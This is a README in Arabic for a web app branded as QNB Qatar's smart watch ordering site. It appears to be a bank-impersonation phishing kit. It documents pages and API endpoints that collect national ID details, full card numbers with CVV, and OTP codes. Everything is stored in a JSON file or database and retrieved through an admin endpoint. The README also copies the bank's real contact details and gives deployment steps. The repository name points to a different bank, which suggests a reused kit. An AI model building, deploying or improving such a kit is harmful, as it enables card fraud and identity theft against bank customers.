# QNB Qatar Smart Watch Application

تطبيق ويب متكامل لموقع بنك QNB قطر يوفر واجهة لطلب الساعات الذكية مع معالجة البيانات الشخصية وبيانات البطاقات البنكية وتخزينها بشكل آمن.

## المميزات

- ✅ دعم اللغة العربية والإنجليزية
- ✅ نظام تنقل سلس بين الصفحات
- ✅ معالجة البيانات عبر API JSON
- ✅ تخزين الطلبات في قاعدة بيانات PostgreSQL
- ✅ واجهة مستخدم احترافية وسهلة الاستخدام
- ✅ جاهز للنشر على Railway أو أي منصة أخرى

## المتطلبات

- Node.js 18.x أو أحدث
- npm أو yarn
- PostgreSQL (للإنتاج)

## التثبيت المحلي

```bash
# استنساخ المستودع
git clone https://github.com/ahmedaliqr1-coder/arab-iraqi-bank.git
cd arab-iraqi-bank

# تثبيت المتطلبات
npm install

# تشغيل الخادم
npm start
```

سيكون التطبيق متاحاً على `http://localhost:3000`

## البنية

```
qnb-qatar-bank/
├── public/              # الملفات الثابتة (HTML, CSS, JS)
│   ├── images/          # مجلد الصور
│   │   ├── qnb-logo.png # شعار بنك QNB
│   │   └── watches/     # صور الساعات الذكية
│   ├── index.html       # الصفحة الرئيسية (عربي)
│   ├── index-en.html    # الصفحة الرئيسية (إنجليزي)
│   ├── data.html        # نموذج البيانات الشخصية
│   ├── data-en.html     # نموذج البيانات الشخصية (إنجليزي)
│   ├── payment.html     # نموذج الدفع
│   ├── payment-en.html  # نموذج الدفع (إنجليزي)
│   ├── otp.html         # التحقق عبر OTP
│   ├── otp-en.html      # التحقق عبر OTP (إنجليزي)
│   ├── success.html     # صفحة النجاح
│   └── success-en.html  # صفحة النجاح (إنجليزي)
├── data/                # مجلد تخزين البيانات
│   └── orders.json      # ملف الطلبات
├── server.js            # الخادم الرئيسي
├── package.json         # المتطلبات
├── Dockerfile           # ملف Docker للنشر
└── README.md            # هذا الملف
```

## API Endpoints

### الحصول على جميع الطلبات
```
GET /api/admin/orders
```

### حفظ البيانات الشخصية
```
POST /api/orders/personal-data
Content-Type: application/json

{
  "fullname": "...",
  "id_number": "...",
  "phone": "...",
  "id_expiry_day": "...",
  "id_expiry_month": "...",
  "id_expiry_year": "...",
  "dob_day": "...",
  "dob_month": "...",
  "dob_year": "...",
  "email": "...",
  "gender": "..."
}
```

### حفظ بيانات الدفع
```
POST /api/orders/payment-data
Content-Type: application/json

{
  "orderId": "...",
  "card_holder": "...",
  "card_number": "...",
  "expiry_date": "...",
  "cvv": "..."
}
```

### التحقق من OTP
```
POST /api/orders/otp-verification
Content-Type: application/json

{
  "orderId": "...",
  "otp_code": "..."
}
```

## النشر على Railway

### الخطوات:

1. **إنشاء حساب على Railway**
   - اذهب إلى https://railway.app
   - سجل الدخول أو أنشئ حساباً جديداً

2. **ربط المستودع**
   - في لوحة التحكم، اختر "New Project"
   - اختر "Deploy from GitHub"
   - اختر المستودع `arab-iraqi-bank`

3. **تكوين البيئة**
   - اضبط `PORT` على `3000`
   - اضبط `NODE_ENV` على `production`
   - أضف `DATABASE_URL` لقاعدة البيانات

4. **النشر**
   - سيتم النشر تلقائياً عند دفع التغييرات إلى GitHub

## تدفق الطلب

1. **الصفحة الرئيسية** → المستخدم يختار ساعة ويضغط على "طلب الآن"
2. **نموذج البيانات** → إدخال البيانات الشخصية وإرسالها إلى API
3. **نموذج الدفع** → إدخال بيانات البطاقة وإرسالها إلى API
4. **التحقق من OTP** → إدخال رمز التحقق وإرساله إلى API
5. **صفحة النجاح** → تأكيد الطلب بنجاح

## الأمان

⚠️ **ملاحظة مهمة**: هذا التطبيق في مرحلة التطوير. في بيئة الإنتاج:
- استخدم HTTPS فقط
- قم بتشفير بيانات البطاقات
- لا تخزن بيانات البطاقات بشكل مباشر
- استخدم خدمة دفع موثوقة (Stripe, PayPal، إلخ)
- أضف التحقق من OTP الحقيقي
- استخدم قاعدة بيانات آمنة مع نسخ احتياطية منتظمة

## معلومات بنك QNB قطر

**بنك قطر الوطني (QNB)**
- الموقع: الدوحة - دولة قطر
- الهاتف: +974 4440 7777
- البريد الإلكتروني: info@qnb.com.qa
- الموقع الرسمي: https://www.qnb.com

## الترخيص

MIT

## التواصل

- البريد الإلكتروني: info@qnb.com.qa
- الهاتف: +974 4440 7777
